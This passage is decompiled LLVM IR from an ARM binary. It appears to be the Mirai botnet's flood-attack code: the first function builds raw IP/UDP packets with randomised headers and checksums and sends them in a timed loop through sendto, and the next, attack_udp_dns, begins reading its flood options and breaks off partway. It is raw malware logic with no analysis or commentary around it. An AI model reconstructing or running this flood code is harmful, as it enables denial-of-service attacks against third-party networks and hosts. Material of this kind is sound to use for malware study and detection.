  %v5_d3f0 = or i32 %v4_d3f0, %v3_d3e4
  store i32 %v5_d3f0, i32* @lr, align 4
  %tmp43 = mul i32 %v7_d30c, 256
  %v3_d3f4 = and i32 %tmp43, 65280
  store i32 %v3_d3f4, i32* %r2.global-to-local, align 4
  %v5_d3f8 = trunc i32 %v5_d3ec to i16
  %tmp44 = udiv i32 %v7_d30c, 256
  %v4_d400 = urem i32 %tmp44, 256
  %v5_d400 = or i32 %v4_d400, %v3_d3f4
  store i32 %v5_d400, i32* @r6, align 4
  store i32 %v0_d3c4, i32* @r4, align 4
  %sext5 = mul nuw i32 %v5_d3f0, 65536
  %v4_d4d0 = sdiv i32 %sext5, 65536
  %v1_d47c = trunc i32 %v6_d2c8 to i8
  br label %dec_label_pc_d408

dec_label_pc_d408:                                ; preds = %.thread, %dec_label_pc_d3d8
  %v2_d410 = call i32 @calloc(i32 128, i32 1)
  %v3_d414 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_d414, i32* %r2.global-to-local, align 4
  %v1_d418 = load i32, i32* @sb, align 4
  %v2_d418 = load i32, i32* @r4, align 4
  %v5_d418 = mul i32 %v2_d418, 4
  %v6_d418 = add i32 %v5_d418, %v1_d418
  %v7_d418 = inttoptr i32 %v6_d418 to i32*
  store i32 %v2_d410, i32* %v7_d418, align 4
  %v0_d41c = load i32, i32* %r2.global-to-local, align 4
  %v3_d41c = mul i32 %v0_d41c, 32
  store i32 %v3_d41c, i32* %r3.global-to-local, align 4
  %v0_d420 = load i32, i32* @sb, align 4
  %v4_d420 = mul i32 %v0_d41c, 4
  %v5_d420 = add i32 %v0_d420, %v4_d420
  %v6_d420 = inttoptr i32 %v5_d420 to i32*
  %v7_d420 = load i32, i32* %v6_d420, align 4
  store i32 %v7_d420, i32* @lr, align 4
  %v5_d424 = mul i32 %v0_d41c, 24
  store i32 %v5_d424, i32* %r3.global-to-local, align 4
  %v1_d428 = load i32, i32* @r8, align 4
  %v2_d428 = add i32 %v1_d428, %v5_d424
  store i32 %v2_d428, i32* @r5, align 4
  %v1_d42c = inttoptr i32 %v7_d420 to i8*
  %v2_d42c = load i8, i8* %v1_d42c, align 1
  %tmp = urem i8 %v2_d42c, 16
  %v1_d430 = zext i8 %tmp to i32
  %v1_d434 = or i32 %v1_d430, 64
  store i32 %v1_d434, i32* %r3.global-to-local, align 4
  %v1_d43c = trunc i32 %v1_d434 to i8
  store i8 %v1_d43c, i8* %v1_d42c, align 1
  %v0_d440 = load i32, i32* @lr, align 4
  %v1_d440 = inttoptr i32 %v0_d440 to i8*
  %v2_d440 = load i8, i8* %v1_d440, align 1
  %v1_d444 = and i8 %v2_d440, -16
  %v1_d448 = or i8 %v1_d444, 5
  store i8 %v1_d448, i8* %v1_d440, align 1
  %v2_d454 = load i32, i32* @lr, align 4
  %v3_d454 = add i32 %v2_d454, 1
  %v4_d454 = inttoptr i32 %v3_d454 to i8*
  store i8 %v5_d2ac, i8* %v4_d454, align 1
  %v3_d458 = load i32, i32* %stack_var_-48, align 4
  %v3_d45c = mul i32 %v3_d458, 65536
  %v1_d460 = add i32 %v3_d45c, 2097152
  %v3_d464 = udiv i32 %v1_d460, 256
  %v1_d468 = and i32 %v3_d464, 65280
  %v4_d46c = udiv i32 %v1_d460, 16777216
  %v5_d46c = or i32 %v1_d468, %v4_d46c
  store i32 %v5_d46c, i32* %r3.global-to-local, align 4
  store i32 %v1_d2f4, i32* %r4.global-to-local, align 4
  %v3_d478 = urem i32 %v3_d458, 65536
  store i32 %v3_d478, i32* %r2.global-to-local, align 4
  %v2_d47c = load i32, i32* @lr, align 4
  %v3_d47c = add i32 %v2_d47c, 8
  %v4_d47c = inttoptr i32 %v3_d47c to i8*
  store i8 %v1_d47c, i8* %v4_d47c, align 1
  %v0_d480 = load i32, i32* %r3.global-to-local, align 4
  %v1_d480 = trunc i32 %v0_d480 to i16
  %v2_d480 = load i32, i32* @lr, align 4
  %v3_d480 = add i32 %v2_d480, 2
  %v4_d480 = inttoptr i32 %v3_d480 to i16*
  store i16 %v1_d480, i16* %v4_d480, align 2
  %v0_d484 = load i32, i32* %r2.global-to-local, align 4
  %v1_d484 = mul i32 %v0_d484, 65536
  %v3_d48c = add i32 %v1_d484, 786432
  store i32 %v3_d48c, i32* %r2.global-to-local, align 4
  %v2_d490 = load i32, i32* @lr, align 4
  %v3_d490 = add i32 %v2_d490, 4
  %v4_d490 = inttoptr i32 %v3_d490 to i16*
  store i16 %v5_d3f8, i16* %v4_d490, align 2
  %v0_d494 = load i32, i32* %r2.global-to-local, align 4
  %v3_d494 = udiv i32 %v0_d494, 256
  %v1_d498 = and i32 %v3_d494, 65280
  %v4_d49c = udiv i32 %v0_d494, 16777216
  %v5_d49c = or i32 %v1_d498, %v4_d49c
  store i32 %v5_d49c, i32* %ip.global-to-local, align 4
  %v2_d4a4 = load i32, i32* @lr, align 4
  %v3_d4a4 = add i32 %v2_d4a4, 9
  %v4_d4a4 = inttoptr i32 %v3_d4a4 to i8*
  store i8 17, i8* %v4_d4a4, align 1
  %v0_d4a8 = load i32, i32* %r4.global-to-local, align 4
  %v2_d4a8 = icmp eq i32 %v0_d4a8, 0
  store i32 ptrtoint (i32* @global_var_260b8.92 to i32), i32* %r3.global-to-local, align 4
  br i1 %v2_d4a8, label %.thread, label %bb

bb:                                               ; preds = %dec_label_pc_d408
  store i32 64, i32* %r2.global-to-local, align 4
  %v3_d4b4 = load i32, i32* @lr, align 4
  %v4_d4b4 = add i32 %v3_d4b4, 6
  %v5_d4b4 = inttoptr i32 %v4_d4b4 to i16*
  store i16 64, i16* %v5_d4b4, align 2
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_d408, %bb
  %v2_d4b8 = load i32, i32* @global_var_260b8.92, align 4
  store i32 %v2_d4b8, i32* %r2.global-to-local, align 4
  %v1_d4bc = load i32, i32* @lr, align 4
  %v2_d4bc = add i32 %v1_d4bc, 12
  %v3_d4bc = inttoptr i32 %v2_d4bc to i32*
  store i32 %v2_d4b8, i32* %v3_d4bc, align 4
  %v0_d4c0 = load i32, i32* @r5, align 4
  %v1_d4c0 = add i32 %v0_d4c0, 16
  %v2_d4c0 = inttoptr i32 %v1_d4c0 to i32*
  %v3_d4c0 = load i32, i32* %v2_d4c0, align 4
  store i32 %v3_d4c0, i32* %r3.global-to-local, align 4
  %v0_d4c4 = load i32, i32* @lr, align 4
  %v1_d4c4 = add i32 %v0_d4c4, 20
  store i32 %v1_d4c4, i32* %r4.global-to-local, align 4
  %v0_d4c8 = load i32, i32* %ip.global-to-local, align 4
  %v1_d4c8 = trunc i32 %v0_d4c8 to i16
  %v3_d4c8 = add i32 %v0_d4c4, 24
  %v4_d4c8 = inttoptr i32 %v3_d4c8 to i16*
  store i16 %v1_d4c8, i16* %v4_d4c8, align 2
  %v0_d4cc = load i32, i32* %r3.global-to-local, align 4
  %v1_d4cc = load i32, i32* @lr, align 4
  %v2_d4cc = add i32 %v1_d4cc, 16
  %v3_d4cc = inttoptr i32 %v2_d4cc to i32*
  store i32 %v0_d4cc, i32* %v3_d4cc, align 4
  store i32 %v4_d4d0, i32* %ip.global-to-local, align 4
  store i32 -1, i32* %r3.global-to-local, align 4
  %v1_d4d8 = load i32, i32* @lr, align 4
  %v2_d4d8 = add i32 %v1_d4d8, 28
  %v3_d4d8 = inttoptr i32 %v2_d4d8 to i32*
  store i32 -1, i32* %v3_d4d8, align 4
  %v0_d4dc = load i32, i32* %ip.global-to-local, align 4
  %v1_d4dc = trunc i32 %v0_d4dc to i16
  %v2_d4dc = load i32, i32* %r4.global-to-local, align 4
  %v3_d4dc = add i32 %v2_d4dc, 2
  %v4_d4dc = inttoptr i32 %v3_d4dc to i16*
  store i16 %v1_d4dc, i16* %v4_d4dc, align 2
  %v0_d4e0 = load i32, i32* @lr, align 4
  %v1_d4e0 = add i32 %v0_d4e0, 32
  %v0_d4e4 = load i32, i32* @r6, align 4
  %v1_d4e4 = trunc i32 %v0_d4e4 to i16
  %v3_d4e4 = add i32 %v0_d4e0, 20
  %v4_d4e4 = inttoptr i32 %v3_d4e4 to i16*
  store i16 %v1_d4e4, i16* %v4_d4e4, align 2
  %v3_d4e8 = load i32, i32* %stack_var_-48, align 4
  store i32 %v3_d4e8, i32* %r2.global-to-local, align 4
  %v3_d4ec = call i32 @util_memcpy(i32 %v1_d4e0, i32 %v3_d354, i32 %v3_d4e8)
  %v3_d4f0 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_d4f0, i32* %r3.global-to-local, align 4
  %v1_d4f4 = add i32 %v3_d4f0, 1
  store i32 %v1_d4f4, i32* @r4, align 4
  %v1_d4f8 = load i32, i32* @fp, align 4
  store i32 %v1_d4f4, i32* %stack_var_-44, align 4
  %v5_d500 = icmp slt i32 %v1_d4f4, %v1_d4f8
  br i1 %v5_d500, label %dec_label_pc_d408, label %dec_label_pc_d504.preheader

dec_label_pc_d504.preheader:                      ; preds = %.thread, %dec_label_pc_d3a0
  %v0_d508.ph = phi i32 [ 0, %dec_label_pc_d3a0 ], [ %v1_d4f8, %.thread ]
  %v9_d520 = icmp eq i32 %v3_d3b4, ptrtoint ([3 x i8]* @global_var_ffff.36 to i32)
  br label %dec_label_pc_d504

dec_label_pc_d504:                                ; preds = %dec_label_pc_d504.preheader, %dec_label_pc_d684.dec_label_pc_d504_crit_edge
  %v0_d508 = phi i32 [ %v0_d508.pre, %dec_label_pc_d684.dec_label_pc_d504_crit_edge ], [ %v0_d508.ph, %dec_label_pc_d504.preheader ]
  store i32 0, i32* %r3.global-to-local, align 4
  %v2_d508 = icmp eq i32 %v0_d508, 0
  store i32 0, i32* %stack_var_-44, align 4
  br i1 %v2_d508, label %dec_label_pc_d684, label %dec_label_pc_d514

dec_label_pc_d514:                                ; preds = %dec_label_pc_d504
  br label %dec_label_pc_d5c8

dec_label_pc_d51c:                                ; preds = %dec_label_pc_d5c8
  br i1 %v9_d520, label %dec_label_pc_d650, label %dec_label_pc_d528

dec_label_pc_d528:                                ; preds = %dec_label_pc_d5f0.dec_label_pc_d528_crit_edge, %dec_label_pc_d51c
  %v1_d52c = phi i32 [ %v1_d52c.pre, %dec_label_pc_d5f0.dec_label_pc_d528_crit_edge ], [ ptrtoint ([3 x i8]* @global_var_ffff.36 to i32), %dec_label_pc_d51c ]
  store i32 %v3_d3b8, i32* %r2.global-to-local, align 4
  %v9_d52c = icmp eq i32 %v3_d3b8, %v1_d52c
  br i1 %v9_d52c, label %dec_label_pc_d664, label %dec_label_pc_d534

dec_label_pc_d534:                                ; preds = %dec_label_pc_d650.dec_label_pc_d534_crit_edge, %dec_label_pc_d528
  %v1_d538 = phi i32 [ %v1_d538.pre, %dec_label_pc_d650.dec_label_pc_d534_crit_edge ], [ %v1_d52c, %dec_label_pc_d528 ]
  store i32 %v3_d3bc, i32* %r3.global-to-local, align 4
  %v9_d538 = icmp eq i32 %v3_d3bc, %v1_d538
  br i1 %v9_d538, label %dec_label_pc_d678, label %dec_label_pc_d540

dec_label_pc_d540:                                ; preds = %dec_label_pc_d664, %dec_label_pc_d534, %dec_label_pc_d678
  store i32 0, i32* @r4, align 4
  %v2_d548 = load i32, i32* @r5, align 4
  %v3_d548 = add i32 %v2_d548, 10
  %v4_d548 = inttoptr i32 %v3_d548 to i16*
  store i16 0, i16* %v4_d548, align 2
  %v0_d54c = load i32, i32* @r5, align 4
  store i32 %v0_d54c, i32* @r0, align 4
  %v2_d550 = call i32 @checksum_generic(i32 %v0_d54c, i32 20)
  %v3_d550 = trunc i32 %v2_d550 to i16
  %v3_d554 = load i32, i32* %stack_var_-48, align 4
  store i32 %v3_d554, i32* %r3.global-to-local, align 4
  %v3_d558 = load i32, i32* @r5, align 4
  %v4_d558 = add i32 %v3_d558, 10
  %v5_d558 = inttoptr i32 %v4_d558 to i16*
  store i16 %v3_d550, i16* %v5_d558, align 2
  %v0_d55c = load i32, i32* @r6, align 4
  store i32 %v0_d55c, i32* @r1, align 4
  %v1_d560 = add i32 %v0_d55c, 4
  %v2_d560 = inttoptr i32 %v1_d560 to i16*
  %v3_d560 = load i16, i16* %v2_d560, align 2
  %v4_d560 = zext i16 %v3_d560 to i32
  store i32 %v4_d560, i32* %r2.global-to-local, align 4
  %v0_d564 = load i32, i32* @r4, align 4
  %v1_d564 = trunc i32 %v0_d564 to i16
  %v3_d564 = add i32 %v0_d55c, 6
  %v4_d564 = inttoptr i32 %v3_d564 to i16*
  store i16 %v1_d564, i16* %v4_d564, align 2
  %v0_d568 = load i32, i32* %r3.global-to-local, align 4
  %v1_d568 = add i32 %v0_d568, 12
  store i32 %v1_d568, i32* %r3.global-to-local, align 4
  %v0_d56c = load i32, i32* @r5, align 4
  %v4_d570 = call i32 @checksum_tcpudp(i32 %v0_d56c, i32 %v0_d55c, i32 %v4_d560, i32 %v1_d568)
  %v5_d570 = trunc i32 %v4_d570 to i16
  %v3_d574 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_d574, i32* %r3.global-to-local, align 4
  %v3_d578 = mul i32 %v3_d574, 32
  store i32 %v3_d578, i32* %lr.global-to-local, align 4
  %v3_d57c = load i32, i32* @r6, align 4
  %v4_d57c = add i32 %v3_d57c, 6
  %v5_d57c = inttoptr i32 %v4_d57c to i16*
  store i16 %v5_d570, i16* %v5_d57c, align 2
  %v0_d580 = load i32, i32* %lr.global-to-local, align 4
  %v1_d580 = load i32, i32* %r3.global-to-local, align 4
  %tmp45 = mul i32 %v1_d580, -8
  %v5_d580 = add i32 %v0_d580, %tmp45
  store i32 %v5_d580, i32* %lr.global-to-local, align 4
  %v0_d584 = load i32, i32* @r6, align 4
  %v1_d584 = add i32 %v0_d584, 2
  %v2_d584 = inttoptr i32 %v1_d584 to i16*
  %v3_d584 = load i16, i16* %v2_d584, align 2
  %v4_d584 = zext i16 %v3_d584 to i32
  store i32 %v4_d584, i32* @r6, align 4
  %v3_d588 = load i32, i32* %stack_var_-48, align 4
  store i32 %v3_d588, i32* %r2.global-to-local, align 4
  %v1_d58c = load i32, i32* @r8, align 4
  %v2_d58c = add i32 %v1_d58c, %v5_d580
  store i32 %v2_d58c, i32* @lr, align 4
  %v3_d590 = add i32 %v2_d58c, 2
  %v4_d590 = inttoptr i32 %v3_d590 to i16*
  store i16 %v3_d584, i16* %v4_d590, align 2
  store i32 16384, i32* %r3.global-to-local, align 4
  store i32 16, i32* %ip.global-to-local, align 4
  %v0_d59c = load i32, i32* @r5, align 4
  %v0_d5a0 = load i32, i32* %r2.global-to-local, align 4
  %v1_d5a0 = add i32 %v0_d5a0, 32
  store i32 %v1_d5a0, i32* %r2.global-to-local, align 4
  %v0_d5a4 = load i32, i32* @sl, align 4
  %v0_d5a8 = load i32, i32* @lr, align 4
  %v6_d5b0 = call i32 @__libc_sendto(i32 %v0_d5a4, i32 %v0_d59c, i32 %v1_d5a0, i32 16384, i32 %v0_d5a8, i32 16)
  %v3_d5b4 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_d5b4, i32* %r3.global-to-local, align 4
  %v1_d5b8 = add i32 %v3_d5b4, 1
  %v1_d5bc = load i32, i32* @fp, align 4
  store i32 %v1_d5b8, i32* %stack_var_-44, align 4
  %v6_d5c4 = icmp slt i32 %v1_d5b8, %v1_d5bc
  br i1 %v6_d5c4, label %dec_label_pc_d5c8, label %dec_label_pc_d684

dec_label_pc_d5c8:                                ; preds = %dec_label_pc_d540, %dec_label_pc_d514
  %v1_d5d8 = phi i32 [ %v1_d5b8, %dec_label_pc_d540 ], [ 0, %dec_label_pc_d514 ]
  %v5_d5cc = mul i32 %v1_d5d8, 24
  %v1_d5d0 = load i32, i32* @r8, align 4
  %v2_d5d0 = add i32 %v1_d5d0, %v5_d5cc
  store i32 %v2_d5d0, i32* %r3.global-to-local, align 4
  %v1_d5d4 = add i32 %v2_d5d0, 20
  %v2_d5d4 = inttoptr i32 %v1_d5d4 to i8*
  %v3_d5d4 = load i8, i8* %v2_d5d4, align 1
  %v4_d5d4 = zext i8 %v3_d5d4 to i32
  store i32 %v4_d5d4, i32* %r2.global-to-local, align 4
  %v0_d5d8 = load i32, i32* @sb, align 4
  %v4_d5d8 = mul i32 %v1_d5d8, 4
  %v5_d5d8 = add i32 %v0_d5d8, %v4_d5d8
  %v6_d5d8 = inttoptr i32 %v5_d5d8 to i32*
  %v7_d5d8 = load i32, i32* %v6_d5d8, align 4
  store i32 %v7_d5d8, i32* @r5, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_ffff.36 to i32), i32* @r7, align 4
  %v1_d5e8 = add i32 %v7_d5d8, 20
  store i32 %v1_d5e8, i32* @r6, align 4
  %tmp46 = icmp ugt i8 %v3_d5d4, 31
  br i1 %tmp46, label %dec_label_pc_d51c, label %dec_label_pc_d5f0

dec_label_pc_d5f0:                                ; preds = %dec_label_pc_d5c8
  %v1_d5f0 = add i32 %v2_d5d0, 16
  %v2_d5f0 = inttoptr i32 %v1_d5f0 to i32*
  %v3_d5f0 = load i32, i32* %v2_d5f0, align 4
  store i32 %v3_d5f0, i32* %r4.global-to-local, align 4
  %v0_d5f4 = call i32 @rand_next()
  %v3_d5f8 = load i32, i32* %stack_var_-44, align 4
  %v5_d600 = mul i32 %v3_d5f8, 24
  %v1_d604 = and i32 %v3_d5f0, 16711680
  store i32 %v1_d604, i32* %ip.global-to-local, align 4
  %v3_d608 = udiv i32 %v3_d5f0, 16777216
  %v4_d60c = udiv i32 %v1_d604, 256
  %v5_d60c = or i32 %v4_d60c, %v3_d608
  store i32 %v5_d60c, i32* %r2.global-to-local, align 4
  %v1_d610 = load i32, i32* @r8, align 4
  %v2_d610 = add i32 %v1_d610, %v5_d600
  %v1_d614 = and i32 %v3_d5f0, 65280
  store i32 %v1_d614, i32* %r3.global-to-local, align 4
  %v1_d618 = add i32 %v2_d610, 20
  %v2_d618 = inttoptr i32 %v1_d618 to i8*
  %v3_d618 = load i8, i8* %v2_d618, align 1
  %v4_d618 = zext i8 %v3_d618 to i32
  store i32 %v4_d618, i32* %ip.global-to-local, align 4
  %v5_d620 = call i32 @llvm.bswap.i32(i32 %v3_d5f0)
  %v7_d624 = lshr i32 %v0_d5f4, %v4_d618
  %v8_d624 = add i32 %v7_d624, %v5_d620
  store i32 %v8_d624, i32* %r2.global-to-local, align 4
  %v5_d640 = call i32 @llvm.bswap.i32(i32 %v8_d624)
  store i32 %v5_d640, i32* %r3.global-to-local, align 4
  %v1_d644 = load i32, i32* @r7, align 4
  %v9_d644 = icmp eq i32 %v3_d3b4, %v1_d644
  %v1_d648 = load i32, i32* @r5, align 4
  %v2_d648 = add i32 %v1_d648, 16
  %v3_d648 = inttoptr i32 %v2_d648 to i32*
  store i32 %v5_d640, i32* %v3_d648, align 4
  br i1 %v9_d644, label %dec_label_pc_d650, label %dec_label_pc_d5f0.dec_label_pc_d528_crit_edge

dec_label_pc_d5f0.dec_label_pc_d528_crit_edge:    ; preds = %dec_label_pc_d5f0
  %v1_d52c.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_d528

dec_label_pc_d650:                                ; preds = %dec_label_pc_d5f0, %dec_label_pc_d51c
  %v0_d650 = call i32 @rand_next()
  %v1_d650 = trunc i32 %v0_d650 to i16
  store i32 %v3_d3b8, i32* %r2.global-to-local, align 4
  %v1_d658 = load i32, i32* @r7, align 4
  %v9_d658 = icmp eq i32 %v3_d3b8, %v1_d658
  %v3_d65c = load i32, i32* @r5, align 4
  %v4_d65c = add i32 %v3_d65c, 4
  %v5_d65c = inttoptr i32 %v4_d65c to i16*
  store i16 %v1_d650, i16* %v5_d65c, align 2
  br i1 %v9_d658, label %dec_label_pc_d664, label %dec_label_pc_d650.dec_label_pc_d534_crit_edge

dec_label_pc_d650.dec_label_pc_d534_crit_edge:    ; preds = %dec_label_pc_d650
  %v1_d538.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_d534

dec_label_pc_d664:                                ; preds = %dec_label_pc_d650, %dec_label_pc_d528
  %v0_d664 = call i32 @rand_next()
  %v1_d664 = trunc i32 %v0_d664 to i16
  store i32 %v3_d3bc, i32* %r3.global-to-local, align 4
  %v1_d66c = load i32, i32* @r7, align 4
  %v9_d66c = icmp eq i32 %v3_d3bc, %v1_d66c
  %v3_d670 = load i32, i32* @r5, align 4
  %v4_d670 = add i32 %v3_d670, 20
  %v5_d670 = inttoptr i32 %v4_d670 to i16*
  store i16 %v1_d664, i16* %v5_d670, align 2
  br i1 %v9_d66c, label %dec_label_pc_d678, label %dec_label_pc_d540

dec_label_pc_d678:                                ; preds = %dec_label_pc_d664, %dec_label_pc_d534
  %v0_d678 = call i32 @rand_next()
  %v1_d678 = trunc i32 %v0_d678 to i16
  %v3_d67c = load i32, i32* @r6, align 4
  %v4_d67c = add i32 %v3_d67c, 2
  %v5_d67c = inttoptr i32 %v4_d67c to i16*
  store i16 %v1_d678, i16* %v5_d67c, align 2
  br label %dec_label_pc_d540

dec_label_pc_d684:                                ; preds = %dec_label_pc_d540, %dec_label_pc_d504
  %v2_d688 = call i32 @__GI_time(i32* null)
  store i32 %v2_d33c, i32* %ip.global-to-local, align 4
  %v6_d694 = icmp slt i32 %v2_d33c, %v2_d688
  br i1 %v6_d694, label %dec_label_pc_d698, label %dec_label_pc_d684.dec_label_pc_d504_crit_edge

dec_label_pc_d684.dec_label_pc_d504_crit_edge:    ; preds = %dec_label_pc_d684
  %v0_d508.pre = load i32, i32* @fp, align 4
  br label %dec_label_pc_d504

dec_label_pc_d698:                                ; preds = %dec_label_pc_d684, %entry, %dec_label_pc_d6a4
  %v1_d6a0 = phi i32 [ %v3_d368, %entry ], [ %v1_d6a8, %dec_label_pc_d6a4 ], [ %v2_d688, %dec_label_pc_d684 ]
  store i32 %v3_d248, i32* %r4.global-to-local, align 4
  store i32 %v27_d248, i32* %lr.global-to-local, align 4
  ret i32 %v1_d6a0

dec_label_pc_d6a4:                                ; preds = %dec_label_pc_d378
  %v0_d6a4 = load i32, i32* @sl, align 4
  %v1_d6a8 = call i32 @__GI___libc_close(i32 %v0_d6a4)
  br label %dec_label_pc_d698

; uselistorder directives
  uselistorder i32 %v5_d640, { 1, 0 }
  uselistorder i32 %v3_d5f0, { 2, 1, 3, 0, 4 }
  uselistorder i32 %v1_d5b8, { 1, 2, 0 }
  uselistorder i32 %v5_d580, { 1, 0 }
  uselistorder i32 %v0_d55c, { 1, 0, 2, 3 }
  uselistorder i32 %v1_d4f4, { 1, 0, 2 }
  uselistorder i32 %v3_d458, { 1, 0 }
  uselistorder i32 %v0_d41c, { 1, 2, 0 }
  uselistorder i32 %v3_d3f4, { 1, 0 }
  uselistorder i32 %v0_d3ac, { 1, 0, 2 }
  uselistorder i32 %v3_d368, { 1, 2, 3, 0 }
  uselistorder i32 %v2_d33c, { 1, 0 }
  uselistorder i32 %v7_d30c, { 1, 0, 3, 2, 4 }
  uselistorder i32 %v1_d2f4, { 1, 0 }
  uselistorder i32 %v6_d2c8, { 1, 0 }
  uselistorder i32 %v8_d2b0, { 1, 0, 2 }
  uselistorder i32 %v5_d28c, { 1, 0 }
  uselistorder i32* %stack_var_-48, { 1, 2, 3, 4, 0, 5 }
  uselistorder i32* %stack_var_-44, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 11, 9, 10 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 3, 12, 4, 5, 6, 7, 8, 9, 10, 11, 14, 13, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 0 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 9, 4, 5, 6, 7, 8, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 0 }
  uselistorder label %dec_label_pc_d698, { 2, 0, 1 }
  uselistorder label %dec_label_pc_d540, { 2, 0, 1 }
  uselistorder label %dec_label_pc_d504, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @attack_udp_dns(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-76 = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-2124 = alloca i32, align 4
  %v18_d6b4 = load i32, i32* @sb, align 4
  %v27_d6b4 = load i32, i32* @lr, align 4
  store i32 0, i32* @sl, align 4
  store i32 %arg1, i32* @fp, align 4
  store i32 %arg2, i32* %r0.global-to-local, align 4
  store i32 4, i32* %r1.global-to-local, align 4
  store i32 %arg4, i32* @r5, align 4
  store i32 %arg5, i32* @r4, align 4
  store i32 0, i32* %stack_var_-44, align 4
  %v2_d6e4 = call i32 @calloc(i32 %arg2, i32 4)
  %v0_d6e8 = load i32, i32* @r4, align 4
  store i32 %v0_d6e8, i32* %r1.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  %v0_d6f4 = load i32, i32* @sl, align 4
  store i32 %v0_d6f4, i32* %r3.global-to-local, align 4
  %v0_d6f8 = load i32, i32* @r5, align 4
  store i32 %v0_d6f8, i32* %r0.global-to-local, align 4
  %v5_d6fc = inttoptr i32 %v0_d6e8 to i32*
  %v6_d6fc = call i32 @attack_get_opt_int(i32 %v0_d6f8, i32* %v5_d6fc, i32 2, i32 %v0_d6f4)
  %v1_d708 = urem i32 %v6_d6fc, 256
  store i32 %v1_d708, i32* %ip.global-to-local, align 4
  %v0_d70c = load i32, i32* @r4, align 4
  store i32 %v0_d70c, i32* %r1.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_ffff.36 to i32), i32* %r3.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v0_d718 = load i32, i32* @r5, align 4
  store i32 %v0_d718, i32* %r0.global-to-local, align 4
  %v7_d720 = inttoptr i32 %v0_d70c to i32*
  %v8_d720 = call i32 @attack_get_opt_int(i32 %v0_d718, i32* %v7_d720, i32 3, i32 ptrtoint ([3 x i8]* @global_var_ffff.36 to i32))
  %v0_d724 = load i32, i32* @r4, align 4
  store i32 %v0_d724, i32* %r1.global-to-local, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  store i32 64, i32* %r3.global-to-local, align 4
  %v0_d734 = load i32, i32* @r5, align 4
  store i32 %v0_d734, i32* %r0.global-to-local, align 4
  %v5_d738 = inttoptr i32 %v0_d724 to i32*
  %v6_d738 = call i32 @attack_get_opt_int(i32 %v0_d734, i32* %v5_d738, i32 4, i32 64)
  %v0_d740 = load i32, i32* @r4, align 4
  store i32 %v0_d740, i32* %r1.global-to-local, align 4
  %v1_d744 = urem i32 %v6_d738, 256
  store i32 %v1_d744, i32* %ip.global-to-local, align 4
  store i32 5, i32* %r2.global-to-local, align 4
  %v0_d74c = load i32, i32* @sl, align 4
  store i32 %v0_d74c, i32* %r3.global-to-local, align 4
  %v0_d750 = load i32, i32* @r5, align 4
  store i32 %v0_d750, i32* %r0.global-to-local, align 4
  %v6_d758 = inttoptr i32 %v0_d740 to i32*
  %v7_d758 = call i32 @attack_get_opt_int(i32 %v0_d750, i32* %v6_d758, i32 5, i32 %v0_d74c)
  %v1_d764 = urem i32 %v7_d758, 256
  store i32 %v1_d764, i32* %ip.global-to-local, align 4
  %v0_d768 = load i32, i32* @r4, align 4
  store i32 %v0_d768, i32* %r1.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_ffff.36 to i32), i32* %r3.global-to-local, align 4
  store i32 6, i32* %r2.global-to-local, align 4
  %v0_d774 = load i32, i32* @r5, align 4
  store i32 %v0_d774, i32* %r0.global-to-local, align 4
  %v6_d77c = inttoptr i32 %v0_d768 to i32*
  %v7_d77c = call i32 @attack_get_opt_int(i32 %v0_d774, i32* %v6_d77c, i32 6, i32 ptrtoint ([3 x i8]* @global_var_ffff.36 to i32))
  %v0_d780 = load i32, i32* @r4, align 4
  store i32 %v0_d780, i32* %r1.global-to-local, align 4
  store i32 7, i32* %r2.global-to-local, align 4
  store i32 53, i32* %r3.global-to-local, align 4
  %v0_d790 = load i32, i32* @r5, align 4
  store i32 %v0_d790, i32* %r0.global-to-local, align 4
  %v5_d794 = inttoptr i32 %v0_d780 to i32*
  %v6_d794 = call i32 @attack_get_opt_int(i32 %v0_d790, i32* %v5_d794, i32 7, i32 53)
  %v0_d79c = load i32, i32* @r4, align 4
  store i32 %v0_d79c, i32* %r1.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_ffff.36 to i32), i32* %r3.global-to-local, align 4
  store i32 9, i32* %r2.global-to-local, align 4
  %v0_d7ac = load i32, i32* @r5, align 4
  store i32 %v0_d7ac, i32* %r0.global-to-local, align 4
  %v6_d7b0 = inttoptr i32 %v0_d79c to i32*
  %v7_d7b0 = call i32 @attack_get_opt_int(i32 %v0_d7ac, i32* %v6_d7b0, i32 9, i32 ptrtoint ([3 x i8]* @global_var_ffff.36 to i32))
  %v0_d7b4 = load i32, i32* @r4, align 4
  store i32 %v0_d7b4, i32* %r1.global-to-local, align 4
  %v0_d7bc = load i32, i32* @sl, align 4
  store i32 %v0_d7bc, i32* %r2.global-to-local, align 4
  store i32 12, i32* %r3.global-to-local, align 4
